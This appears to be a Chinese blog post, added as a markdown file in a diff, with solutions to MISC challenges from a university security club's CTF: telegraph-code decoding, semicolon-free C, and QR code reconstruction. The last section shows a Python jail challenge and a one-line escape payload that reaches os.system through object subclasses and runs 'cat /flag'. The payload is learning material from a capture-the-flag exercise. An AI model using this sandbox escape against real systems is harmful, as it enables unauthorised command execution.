@@ -1,0 +1,404 @@
+---
+title: 2023·CSSS安全招新MISC部分
+date: '2023-11-19'
+categories:
+  - Study
+  - CTF
+tags:
+  - MISC
+  - CTF
+math: true
+image:
+  path: /img/2c460c79f517d5240caa8a48057e632c.png
+  alt: ~~~
+category: CTF
+description: 四个阿拉伯数字表示一个数字，由此出发，我发现我刚才那一串 01 写反了，要倒着看：
+number: '030'
+selected: false
+author: Akejyo
+importedFrom: CTF/2023-11-19-cnss.md
+---
+## 2023·CNSS 招新 MISC 部分
+
+只放了几个稍微复杂点的题，但是没有 hw5，会不了一点 😡
+
+### 👽 三体
+
+![b827fd04c60418e3a465c1c46d0042dd](https://raw.githubusercontent.com/Akejyo/imageForBlog/master/img/b827fd04c60418e3a465c1c46d0042dd.png)
+
+[https://academic-accelerator.com/encyclopedia/zh-cn/punched-tape](https://academic-accelerator.com/encyclopedia/zh-cn/punched-tape)
+
+查到 5 个点一行是叫“博科码”，但是这里好像是 4 个点.
+
+Unicode ×
+
+GB2312-80 区位码/GBK/GB18030 ×
+
+[Hollerith punched card code (acm.org)](https://dl.acm.org/doi/pdf/10.1145/362991.363052) ×
+
+```
+0010	2-
+0111	7-
+0000	0-
+0101	5-
+0000	0-
+1001	9-
+1100	c-
+1100	c-
+0000	0-
+1000	8-
+0010	2-
+1000	8-
+0000	0-
+0111    -5
+1011    -b
+1000    -8
+0000    -
+0001	1-
+0001	1-
+0101	5-
+0010	2-
+0110	6-
+1111	f-
+1000	8-
+0001	1-
+0000	0-
+1100	c-
+0101-
+0001-
+1011-
+1110-
+0100-
+0001-
+0000-
+0000-
+1000-
+0000-
+0101-
+0010-
+0101-
+0000-
+1111-
+0101-
+1100-
+0000-
+1001-
+1100-
+1100-
+0000-
+0000-
+0000-
+1000-
+0001-
+0000-
+1001-
+1001-
+0000-
+1001-
+1010-
+1101-
+0000-
+0010-
+1101-
+1111-
+0000-
+0101-
+1000-
+1100-
+0000-
+0110-
+1011-
+1110-
+0010-
+0111-
+0000-
+0100-
+0010-
+0110-
+1010-
+0100-
+0010-
+0110-
+1010-
+0100-
+0010-
+0110-
+1001-
+1111-
+0010-2
+0110-6
+1001-9
+0100-4
+```
+
+原来是电报码.
+
+![2c460c79f517d5240caa8a48057e632c](https://raw.githubusercontent.com/Akejyo/imageForBlog/master/img/2c460c79f517d5240caa8a48057e632c.png)
+
+四个阿拉伯数字表示一个数字，由此出发，我发现我刚才那一串 01 写反了，要倒着看：
+
+```
+0010/1001/0110/0100
+1111/1001/0110/0100
+0010/0101/0110/0100
+0010/0101/0110/0100
+```
+
+前四个，`2964/f964/2564/2564`
+
+理解不能，CNSS 这四个字母间隔不至于这样吧（
+
+[https://finedx.com/a/tools/telecode.php](https://finedx.com/a/tools/telecode.php)
+
+ＣＮＳＳ（注意这里的字母是中文）
+
+```
+ＣＮＳＳ
+电报码: 9876 9887 9892 9892
+```
+
+我注意到刚才那个编码最后俩位一样的，这就很合理，因为电报码里的字母前两位都是 98，反过来看看.
+
+```
+0010/0110/1001/0100
+0010/0110/1001/1111
+0010/0110/1010/0100
+0010/0110/1010/0100
+```
+
+`2694/269f/26a4/26a4`
+
+感觉结束了，269f-2694=N-C
+
+考虑到一个是十进制，一个是十六进制，以 C: 2694 为基准把所有偏移弄出来.
+
+之前写的那一串 01，只需从末尾开始每次选 4 行放一起即可，不必作翻转之类的操作.
+
+开写：[进制转换器 - Codeeeee 在线工具](https://www.codeeeee.com/encode/radix.html)
+
+```
+00100111000001010000100111001100000010000010100000000111101110000000000100010101001001101111100000010000110001010001101111100100000100000000100000000101001001010000111101011100000010011100110000000000000010000001000010011001000010011010110100000010110111110000010110001100000001101011111000100111000001000010011010100100001001101010010000100110100111110010011010010100
+```
+
+```
+16进制	偏移		电报码
+-------------------------
+2705	113			9989
+09cc	-7368		2508
+0828	-7788		2088
+07b8	-7900		1976
+0115	-9599		277
+26f8	100			   9976
+10c5	-5583		4293
+1be4	-2736		7140
+1008	-5772		4104
+0525	-8559		1317
+0f5c	-5944		3932
+09cc	-7368		2508
+0008	-9868      8
+1099	-5627      4249
+09ad	-7399	   2477
+02df	-9141		735
+058c	-8456	   1420
+06be	-8150	  1726
+2704	112			9988
+26a4	16			9892
+26a4	16			9892
+269f	11			9887
+2694	0			9876
+```
+
+```
+9876 9887 9892 9892 9988 1726 1420 0735 2477 4249 0008 2508 3932 1317 4104 7140 4293 9976 0277 1976 2088 2508 9989
+```
+
+flag：`ＣＮＳＳ（弱小和无知不是生存的障碍，傲慢才是）`
+
+***
+
+### 🧀Hello world 3
+
+要求不使用分号，编写 C 程序输出字符串.
+
+[C program to print Hello world without using semicolon - YouTube](https://www.youtube.com/watch?v=dGleSGZA2sQ)
+
+```c
+#include <stdio.h>
+int main(){
+	if(printf("Hi, CNSS!")){
+
+	}
+}
+```
+
+### 🍜Hello world 4
+
+要求不使用#，输出字符串.
+
+来自 gpt4 :
+
+```c
+extern "C" {
+    int write(int, const void*, unsigned int);
+}
+
+int main() {
+    const char *str = "Hi, CNSS!\n";
+    write(1, str, 10);
+    return 0;
+}
+```
+
+> [How to write a running C code without main()? - GeeksforGeeks](https://www.geeksforgeeks.org/write-running-c-code-without-main/)
+> 奇怪的东西
+
+### 💢 二维码
+
+![image-20231001144818246](https://raw.githubusercontent.com/Akejyo/imageForBlog/master/img/image-20231001144818246.png)
+
+看看两处的格式信息是否一致，结果是一样的：
+
+发现一个网址：\[[QR Code Tutorial - Thonky.com](https://www.thonky.com/qr-code-tutorial/)]\([https://www.thonky.com/qr-code-tutorial/format-version-information#:\~:text=The](https://www.thonky.com/qr-code-tutorial/format-version-information#:~:text=The) format information string encodes which error correction,32 (4 times 8) possible format information strings.)
+
+Flag 应该是字母数字模式，由二维码尺寸得知是 version 3，the character count indicator must be 9 bits long.
+
+[字母数字模式编码 - 二维码教程 (thonky.com)](https://www.thonky.com/qr-code-tutorial/alphanumeric-mode-encoding)这里介绍了怎么把数据进行编码，不过这里应该不需要知道.
+
+后面介绍如何计算纠错码真是难以阅读，我往后翻了翻，也许这才是我需要的页面：
+
+[Module Placement in Matrix - QR Code Tutorial (thonky.com)](https://www.thonky.com/qr-code-tutorial/module-placement-matrix)
+
+![image-20231004023645483](https://raw.githubusercontent.com/Akejyo/imageForBlog/master/img/image-20231004023645483.png)
+
+data 存放，宽度 2，注意左边跳过了 timing 那一列
+
+![image-20231004023737481](https://raw.githubusercontent.com/Akejyo/imageForBlog/master/img/image-20231004023737481.png)
+
+> When the alignment pattern is reached, simply skip the modules that are part of the alignment pattern and continue upward.
+>
+> 按照顺序填，被占位置了就放下一个地方
+>
+> In summary, always proceed normally along the columns, skipping any modules that are used by function patterns or reserved areas. The only exception is the vertical timing pattern.
+
+下一步是选择 Mask 样式，一共 8 种样式，每一种都用一次，然后计算 penalty score，选择最小的那个样式，大概就是让二维码更加合理，容易
+
+然后生成格式信息串 (Format Information String)，很多步骤，好在有表格可以直接查：
+
+[Format and Version String Tables - QR Code Tutorial (thonky.com)](https://www.thonky.com/qr-code-tutorial/format-version-tables)
+
+题中格式信息为 `11010 01011 10110` ，查表得到......L 7
+
+![image-20231004153832539](https://raw.githubusercontent.com/Akejyo/imageForBlog/master/img/image-20231004153832539.png)
+
+试了 L1、L5、H7 都不对
+
+> To select the most efficient mode for the QR code, examine the characters in the input string and check for the following conditions.
+>
+> 1. If the input string only consists of decimal digits (0 through 9), use **numeric mode**.
+> 2. If numeric mode is not applicable, and if all of the characters in the input string can be found in the left column of the [alphanumeric table](https://www.thonky.com/qr-code-tutorial/alphanumeric-table), use **alphanumeric mode**. Lowercase letters CANNOT be encoded in alphanumeric mode; only uppercase.
+> 3. If there is a character that is not in the left column of the [alphanumeric table](https://www.thonky.com/qr-code-tutorial/alphanumeric-table) but can be encoded in ISO 8859-1, use **byte mode**. As mentioned above, QR code readers may be able to recognize UTF-8 in byte mode.
+> 4. If all of the characters are in the Shift JIS character set, use **Kanji mode**. Shift JIS characters can be encoded in UTF-8 instead, so it is possible to use byte mode for Kanji, but it is generally more efficient to use Shift JIS and use Kanji mode for Kanji characters.
+
+我猜 flag 是 CNSS\{format_info_pattern}，25 个字符，byte mode version 3 可以用 Q 级，试试 Q7，又寄了.
+
+我又想到 penalty score 的一个要求是黑白差不多，`11010 01011 10110` 里面 9 个 1，M3 也是，试试寄了，再试试 M4，寄 😭😭😭
+
+我觉得问题很大，我从 L0 画到 Q7 了还没出现，应该是思路错了，可能格式信息是对的，但是纠错码算错了？在知道 L7 的情况下，我应该是可以把 data 给复原出来的
+
+![image-20231004201248116](https://raw.githubusercontent.com/Akejyo/imageForBlog/master/img/image-20231004201248116.png)
+
+难绷，H0 出来了，我几乎就要放弃（
+
+`cnss{Ur_Qr_K1NnG!}`
+
+### ⛓️ jailbreak
+
+> 此为2024暑假题
+
+```python
+# FROM python:3.12.3-alpine
+
+import base64
+import ast
+import traceback
+BANNER = """
+          .?77777777777777$.            
+          777..777777777777$+           
+         .77    7777777777$$$           
+         .777 .7777777777$$$$           
+         .7777777777777$$$$$$           
+         ..........:77$$$$$$$           
+  .77777777777777777$$$$$$$$$.=======.  
+ 777777777777777777$$$$$$$$$$.========  
+7777777777777777$$$$$$$$$$$$$.========= 
+77777777777777$$$$$$$$$$$$$$$.========= 
+777777777777$$$$$$$$$$$$$$$$ :========+.
+77777777777$$$$$$$$$$$$$$+..=========++~
+777777777$$..~=====================+++++
+77777777$~.~~~~=~=================+++++.
+777777$$$.~~~===================+++++++.
+77777$$$$.~~==================++++++++: 
+ 7$$$$$$$.==================++++++++++. 
+ .,$$$$$$.================++++++++++~.  
+         .=========~.........           
+         .=============++++++           
+         .===========+++..+++           
+         .==========+++.  .++           
+          ,=======++++++,,++,           
+          ..=====+++++++++=.            
+                ..~+=...     
+""".strip('\n')
+
+# TODO: Filter out more dangerous operations
+FORBIDDEN = [
+    ast.Import,
+    ast.ImportFrom,
+    ast.ClassDef,
+    ast.Assign,
+]
+
+
+def check(c):
+    c = ast.parse(c, mode='exec')
+    for i in ast.walk(c):
+        if type(i) in FORBIDDEN:
+            return False
+
+    return True
+
+
+print(BANNER)
+
+code = input("Enter base64 encoded code: ")
+code = base64.b64decode(code.strip()).decode("utf-8")
+if len(code) > 0x1000:
+    print("Code too long")
+    exit()
+if not check(code):
+    print("Forbidden operation detected")
+    exit()
+
+try:
+    code = compile(code, '<CNSS>', 'exec')
+    exec(code, {'__builtins__': {}})
+except Exception as e:
+    print("Error:", e)
+    traceback.print_exc()
+
+```
+
+python ban 了 ast.Import,ast.ImportFrom,ast.ClassDef,ast.Assign,以及 `__builtins__`
+
+这类题目的关键词是 pyjail，找了几个有用的网站：
+
+[https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins)
+
+[https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/how-to-solve-a-pyjail.md#how-easily-solve-a-pyjail](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/how-to-solve-a-pyjail.md#how-easily-solve-a-pyjail)
+
+[https://github.com/salvatore-abello/pyjail](https://github.com/salvatore-abello/pyjail)
+
+最后执行的代码：
+
+`[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close' ][0]['sy'+'stem']('cat /flag')`
+
+其实我这是第一次看到 pyjail 的题，不会写，后面摆了
